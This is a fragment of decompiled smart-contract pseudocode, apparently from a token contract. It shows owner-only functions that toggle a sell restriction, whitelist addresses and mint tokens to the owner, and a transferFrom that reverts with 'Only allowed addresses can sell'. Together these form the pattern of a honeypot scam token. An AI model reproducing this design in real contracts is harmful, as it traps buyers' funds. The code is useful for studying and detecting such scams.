...
function sub_987c8e7f(?) payable {
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    stor7 = 0
}

function sub_ede95280(?) payable {
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    stor7 = 1
}
...
function addAddressToAllowed(address arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
...
function sub_bca7fa9a(?) payable {
    ...
    if balanceOf[stor0] > (-1 * 10^18 * arg1) - 1:
        revert with 'NH{q', 17
    balanceOf[stor0] += 10^18 * arg1
    emit Transfer((10^18 * arg1), 0, owner);
}

function sub_a439db30(?) payable {
    require calldata.size - 4 >= 64
...
function transferFrom(address arg1, address arg2, uint256 arg3) payable {
    ...
    if bool(stor6[address(arg1)]) != 1:
        if stor7:
            revert with 0, 'Only allowed addresses can sell'
